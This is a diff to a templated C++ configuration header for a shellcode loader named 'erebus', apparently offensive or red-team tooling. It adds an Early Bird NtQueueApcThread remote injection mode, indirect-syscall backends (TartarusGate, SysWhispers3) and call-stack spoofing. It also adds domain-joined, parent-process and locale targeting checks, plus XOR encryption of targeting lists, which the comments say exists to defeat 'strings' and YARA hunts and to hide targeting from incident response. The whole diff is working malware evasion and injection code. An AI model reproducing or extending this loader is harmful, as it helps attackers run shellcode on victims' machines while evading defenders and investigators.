@@ -62,6 +62,7 @@
 // 2 = CreateFiber         - Fiber-based execution (Self)
 // 3 = EarlyCascade        - Early Bird APC injection via NtQueueApcThread (Remote)
 // 4 = PoolParty           - Worker Factory thread pool injection (Remote)
+// 5 = NtQueueApcThread    - Vanilla NtQueueApcThread Early Bird with jittered post-APC delay (Remote)
 #ifndef CONFIG_INJECTION_TYPE
 #define CONFIG_INJECTION_TYPE {{ INJECTION_TYPE }}
 #endif
@@ -80,6 +81,8 @@
 #define ExecuteShellcode erebus::InjectionEarlyCascade
 #elif CONFIG_INJECTION_TYPE == 4
 #define ExecuteShellcode erebus::InjectionPoolParty
+#elif CONFIG_INJECTION_TYPE == 5
+#define ExecuteShellcode erebus::InjectionNtQueueApcThread
 #endif
 
 // ============================================
@@ -97,94 +100,156 @@
 #define CONFIG_GUARDRAILS_CHECK_TIMING {{ GUARDRAILS_CHECK_TIMING }}
 #define CONFIG_GUARDRAILS_CHECK_SANDBOX {{ GUARDRAILS_CHECK_SANDBOX }}
 
+// Additional targeting checks. These default to 0 so existing builds
+// behave identically. Flip via new builder parameters when rolling out.
+#define CONFIG_GUARDRAILS_CHECK_DOMAIN_JOINED {{ GUARDRAILS_CHECK_DOMAIN_JOINED | default(0) }}
+
 // Decoy file to open when guardrails fail (empty = silent exit)
 #define CONFIG_GUARDRAILS_DECOY_FILE "{{ GUARDRAILS_DECOY_FILE }}"
 
-// --------------------------------------------------------------------------
-// Environment whitelists / blocklists
-// --------------------------------------------------------------------------
-// These lists are rendered inline into GetGuardrailConfig() below. If a list
-// is empty the corresponding array and count stay at their default (nullptr
-// / 0) values, which RunGuardrails() treats as "skip that check". Each array
-// is declared `static const` so it lives in .rdata with no per-call cost.
-//
-// WARNING: The hostnames / usernames / domain names in the arrays below are
-// baked into the loader binary as plaintext and are visible to `strings`. If
-// OPSEC requires obfuscating them, encrypt at build time in shellcrypt and
-// decrypt at runtime before calling GetGuardrailConfig().
+// ============================================
+// SYSCALL BACKEND CONFIGURATION
+// ============================================
+// 0 = TartarusGate  (built-in indirect syscall shim page, default)
+// 1 = SysWhispers3  (generated stubs; requires include/evasion/sw3/ files and
+//                    the Syscalls-asm.x{64,86}.asm sources assembled by the
+//                    loader Makefile)
+#ifndef CONFIG_SYSCALL_BACKEND
+#define CONFIG_SYSCALL_BACKEND {{ SYSCALL_BACKEND | default(0) }}
+#endif
 
-{% if GUARDRAIL_ALLOWED_HOSTNAMES %}
-static const char* g_allowed_hostnames[] = {
-    {% for h in GUARDRAIL_ALLOWED_HOSTNAMES %}"{{ h }}",
-    {% endfor %}
-};
+// ============================================
+// CALLSTACK SPOOFING CONFIGURATION
+// ============================================
+// 0 = disabled
+// 1 = enabled — InitCallstackSpoof() runs in RunEvasionPatches(), locating
+//     `add rsp, 0x68; ret` in ntdll/kernel32. Call sites fill SpoofContext
+//     and dispatch through SpoofCall() (src/evasion/callstack_spoof.asm).
+#ifndef CONFIG_CALLSTACK_SPOOF_ENABLED
+#define CONFIG_CALLSTACK_SPOOF_ENABLED {{ CALLSTACK_SPOOF_ENABLED | default(0) }}
+#endif
+
+// --------------------------------------------------------------------------
+// Environment whitelists / blocklists (XOR-encrypted at build time)
+// --------------------------------------------------------------------------
+// Guardrail scoping entries (hostnames, usernames, domains, IPs) are emitted
+// as XOR-encrypted byte arrays in .data, decrypted in place on first call to
+// GetGuardrailConfig(). This defeats `strings` and family-level YARA string
+// hunts against delivered samples - a determined reverser can still recover
+// them since the key is adjacent to the ciphertext, which is acceptable for
+// scoping data (we only need to frustrate automated triage and avoid leaking
+// targeting to incident response).
+//
+// Each entry's ciphertext includes the trailing NUL byte, also XORed. After
+// decryption the byte array is a valid C string. Pointers are stored into
+// g_*_ptrs[] arrays which are what GuardrailConfig consumes.
+
+#define GR_XOR_KEYLEN {{ GR_XOR_KEY | length }}
+// __attribute__((unused)) silences -Wunused-variable for builds where no
+// guardrail list is populated and DecryptGuardrailLists() is effectively
+// empty. The key still lives in .data and is consulted on first call when
+// any list is non-empty.
+__attribute__((unused))
+static unsigned char g_gr_xor_key[GR_XOR_KEYLEN] = { {% for b in GR_XOR_KEY %}0x{{ '%02x' % b }},{% endfor %} };
+
+{% macro emit_enc_list(varname, entries) -%}
+{% if entries %}
+{% for entry in entries %}
+static unsigned char {{ varname }}_{{ loop.index0 }}[] = { {% for b in entry %}0x{{ '%02x' % b }},{% endfor %} };
+{% endfor %}
+static const char* {{ varname }}_ptrs[{{ entries | length }}];
 {% endif %}
-{% if GUARDRAIL_BLOCKED_HOSTNAMES %}
-static const char* g_blocked_hostnames[] = {
-    {% for h in GUARDRAIL_BLOCKED_HOSTNAMES %}"{{ h }}",
-    {% endfor %}
-};
+{%- endmacro %}
+
+{{ emit_enc_list('g_gr_allowed_hostnames', GR_ENC_GUARDRAIL_ALLOWED_HOSTNAMES) }}
+{{ emit_enc_list('g_gr_blocked_hostnames', GR_ENC_GUARDRAIL_BLOCKED_HOSTNAMES) }}
+{{ emit_enc_list('g_gr_blocked_usernames', GR_ENC_GUARDRAIL_BLOCKED_USERNAMES) }}
+{{ emit_enc_list('g_gr_allowed_ips',       GR_ENC_GUARDRAIL_ALLOWED_IPS) }}
+{{ emit_enc_list('g_gr_blocked_ips',       GR_ENC_GUARDRAIL_BLOCKED_IPS) }}
+{{ emit_enc_list('g_gr_allowed_domains',   GR_ENC_GUARDRAIL_ALLOWED_DOMAINS) }}
+
+{% macro decrypt_list(varname, entries) -%}
+{% if entries %}
+{% for entry in entries %}
+    for (unsigned int i = 0; i < sizeof({{ varname }}_{{ loop.index0 }}); ++i) {
+        {{ varname }}_{{ loop.index0 }}[i] ^= g_gr_xor_key[i % GR_XOR_KEYLEN];
+    }
+    {{ varname }}_ptrs[{{ loop.index0 }}] = (const char*){{ varname }}_{{ loop.index0 }};
+{% endfor %}
 {% endif %}
-{% if GUARDRAIL_BLOCKED_USERNAMES %}
-static const char* g_blocked_usernames[] = {
-    {% for u in GUARDRAIL_BLOCKED_USERNAMES %}"{{ u }}",
-    {% endfor %}
-};
-{% endif %}
-{% if GUARDRAIL_ALLOWED_IPS %}
-static const char* g_allowed_ips[] = {
-    {% for ip in GUARDRAIL_ALLOWED_IPS %}"{{ ip }}",
-    {% endfor %}
-};
-{% endif %}
-{% if GUARDRAIL_BLOCKED_IPS %}
-static const char* g_blocked_ips[] = {
-    {% for ip in GUARDRAIL_BLOCKED_IPS %}"{{ ip }}",
-    {% endfor %}
-};
-{% endif %}
-{% if GUARDRAIL_ALLOWED_DOMAINS %}
-static const char* g_allowed_domains[] = {
-    {% for d in GUARDRAIL_ALLOWED_DOMAINS %}"{{ d }}",
-    {% endfor %}
-};
-{% endif %}
+{%- endmacro %}
+
+// Idempotent on-demand decryption. Runs from GetGuardrailConfig() which is
+// called once at loader entry, before any guardrail check. [MALLEABLE] swap
+// XOR for RC4 here if you need stronger static-analysis resistance.
+inline void DecryptGuardrailLists() {
+    static bool decrypted = false;
+    if (decrypted) return;
+    {{ decrypt_list('g_gr_allowed_hostnames', GR_ENC_GUARDRAIL_ALLOWED_HOSTNAMES) }}
+    {{ decrypt_list('g_gr_blocked_hostnames', GR_ENC_GUARDRAIL_BLOCKED_HOSTNAMES) }}
+    {{ decrypt_list('g_gr_blocked_usernames', GR_ENC_GUARDRAIL_BLOCKED_USERNAMES) }}
+    {{ decrypt_list('g_gr_allowed_ips',       GR_ENC_GUARDRAIL_ALLOWED_IPS) }}
+    {{ decrypt_list('g_gr_blocked_ips',       GR_ENC_GUARDRAIL_BLOCKED_IPS) }}
+    {{ decrypt_list('g_gr_allowed_domains',   GR_ENC_GUARDRAIL_ALLOWED_DOMAINS) }}
+    decrypted = true;
+}
 
 // Helper function to get configured guardrails
 inline erebus::guardrails::GuardrailConfig GetGuardrailConfig() {
     erebus::guardrails::GuardrailConfig config = erebus::guardrails::GetDefaultConfig();
 
     #if CONFIG_GUARDRAILS_ENABLED
+        DecryptGuardrailLists();
+
         config.check_debugger_present      = CONFIG_GUARDRAILS_CHECK_DEBUGGER;
         config.check_remote_debugger       = CONFIG_GUARDRAILS_CHECK_REMOTE_DEBUGGER;
         config.check_debugger_processes    = CONFIG_GUARDRAILS_CHECK_DEBUGGER_PROCESSES;
         config.check_hardware_breakpoints  = CONFIG_GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS;
         config.check_timing_checks         = CONFIG_GUARDRAILS_CHECK_TIMING;
         config.check_sandbox_environment   = CONFIG_GUARDRAILS_CHECK_SANDBOX;
+        config.check_domain_joined         = CONFIG_GUARDRAILS_CHECK_DOMAIN_JOINED;
 
-        {% if GUARDRAIL_ALLOWED_HOSTNAMES %}
-        config.allowed_hostnames      = g_allowed_hostnames;
-        config.hostname_count_allowed = (int)(sizeof(g_allowed_hostnames) / sizeof(g_allowed_hostnames[0]));
+        {% if GUARDRAIL_ALLOWED_PARENTS %}
+        static const char* g_gr_allowed_parents[] = {
+        {% for p in GUARDRAIL_ALLOWED_PARENTS %}"{{ p }}",
+        {% endfor %}
+        };
+        config.allowed_parents      = g_gr_allowed_parents;
+        config.parent_count_allowed = (int)(sizeof(g_gr_allowed_parents) / sizeof(g_gr_allowed_parents[0]));
         {% endif %}
-        {% if GUARDRAIL_BLOCKED_HOSTNAMES %}
-        config.blocked_hostnames      = g_blocked_hostnames;
-        config.hostname_count_blocked = (int)(sizeof(g_blocked_hostnames) / sizeof(g_blocked_hostnames[0]));
+
+        {% if GUARDRAIL_ALLOWED_LOCALES %}
+        static const char* g_gr_allowed_locales[] = {
+        {% for l in GUARDRAIL_ALLOWED_LOCALES %}"{{ l }}",
+        {% endfor %}
+        };
+        config.allowed_locales      = g_gr_allowed_locales;
+        config.locale_count_allowed = (int)(sizeof(g_gr_allowed_locales) / sizeof(g_gr_allowed_locales[0]));
         {% endif %}
-        {% if GUARDRAIL_BLOCKED_USERNAMES %}
-        config.blocked_usernames      = g_blocked_usernames;
-        config.username_count_blocked = (int)(sizeof(g_blocked_usernames) / sizeof(g_blocked_usernames[0]));
+
+        {% if GR_ENC_GUARDRAIL_ALLOWED_HOSTNAMES %}
+        config.allowed_hostnames      = g_gr_allowed_hostnames_ptrs;
+        config.hostname_count_allowed = {{ GR_COUNT_GUARDRAIL_ALLOWED_HOSTNAMES }};
         {% endif %}
-        {% if GUARDRAIL_ALLOWED_IPS %}
-        config.allowed_ips    = g_allowed_ips;
-        config.ip_count_allowed = (int)(sizeof(g_allowed_ips) / sizeof(g_allowed_ips[0]));
+        {% if GR_ENC_GUARDRAIL_BLOCKED_HOSTNAMES %}
+        config.blocked_hostnames      = g_gr_blocked_hostnames_ptrs;
+        config.hostname_count_blocked = {{ GR_COUNT_GUARDRAIL_BLOCKED_HOSTNAMES }};
         {% endif %}
-        {% if GUARDRAIL_BLOCKED_IPS %}
-        config.blocked_ips    = g_blocked_ips;
-        config.ip_count_blocked = (int)(sizeof(g_blocked_ips) / sizeof(g_blocked_ips[0]));
+        {% if GR_ENC_GUARDRAIL_BLOCKED_USERNAMES %}
+        config.blocked_usernames      = g_gr_blocked_usernames_ptrs;
+        config.username_count_blocked = {{ GR_COUNT_GUARDRAIL_BLOCKED_USERNAMES }};
         {% endif %}
-        {% if GUARDRAIL_ALLOWED_DOMAINS %}
-        config.allowed_domains      = g_allowed_domains;
-        config.domain_count_allowed = (int)(sizeof(g_allowed_domains) / sizeof(g_allowed_domains[0]));
+        {% if GR_ENC_GUARDRAIL_ALLOWED_IPS %}
+        config.allowed_ips      = g_gr_allowed_ips_ptrs;
+        config.ip_count_allowed = {{ GR_COUNT_GUARDRAIL_ALLOWED_IPS }};
+        {% endif %}
+        {% if GR_ENC_GUARDRAIL_BLOCKED_IPS %}
+        config.blocked_ips      = g_gr_blocked_ips_ptrs;
+        config.ip_count_blocked = {{ GR_COUNT_GUARDRAIL_BLOCKED_IPS }};
+        {% endif %}
+        {% if GR_ENC_GUARDRAIL_ALLOWED_DOMAINS %}
+        config.allowed_domains      = g_gr_allowed_domains_ptrs;
+        config.domain_count_allowed = {{ GR_COUNT_GUARDRAIL_ALLOWED_DOMAINS }};
         {% endif %}
     #endif
 
